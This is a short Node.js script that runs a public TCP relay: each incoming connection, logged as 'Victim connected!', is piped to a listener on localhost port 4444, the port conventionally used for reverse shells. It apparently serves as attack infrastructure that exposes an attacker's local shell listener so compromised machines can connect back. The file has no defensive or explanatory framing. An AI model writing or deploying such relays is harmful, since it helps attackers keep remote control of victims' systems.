const net = require('net');
const PORT = process.env.PORT || 10000;

const server = net.createServer((socket) => {
    console.log('Victim connected!');
    const client = net.createConnection({ port: 4444, host: 'localhost' });
    socket.pipe(client);
    client.pipe(socket);
    socket.on('error', (e) => console.log('S-Err:', e.message));
    client.on('error', (e) => console.log('C-Err:', e.message));
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`Proxy live on ${PORT}`);
});
